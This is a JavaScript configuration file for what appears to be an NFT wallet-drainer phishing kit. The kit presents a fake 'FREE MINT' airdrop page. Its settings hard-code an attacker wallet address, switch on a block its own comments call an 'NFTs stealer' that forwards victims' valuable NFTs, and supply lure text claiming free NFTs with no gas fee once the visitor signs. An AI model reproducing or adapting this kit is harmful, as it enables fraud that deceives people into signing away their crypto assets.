const receiveAddress = "0x9544Cb57BF13EeaEC4e08FD31765ed10a01A2988";

const collectionInfo = {
    name: " FREE MINT",
    socialMedia: {
        discord: "",
        twitter: "",
        instagram: "",
    },
}

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "1 potato, 2 potatoz, 3 potatoz... 9999 potatoz!",
}

const claimPageInfo = {
    title: "AIRDROP", // <br> is a line break
    shortDescription: "You are eligible to get airdrop ",
    longDescription: "You will get same amount of airdrop NFT based on how many original NFT you have One address can only claim one time, You will get NFT immediately after sign. No need to pay the gas fee",

    claimButtonText: "CLAIM NOW",

    image: "ola.jpeg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.07,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "0x9544Cb57BF13EeaEC4e08FD31765ed10a01A2988" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion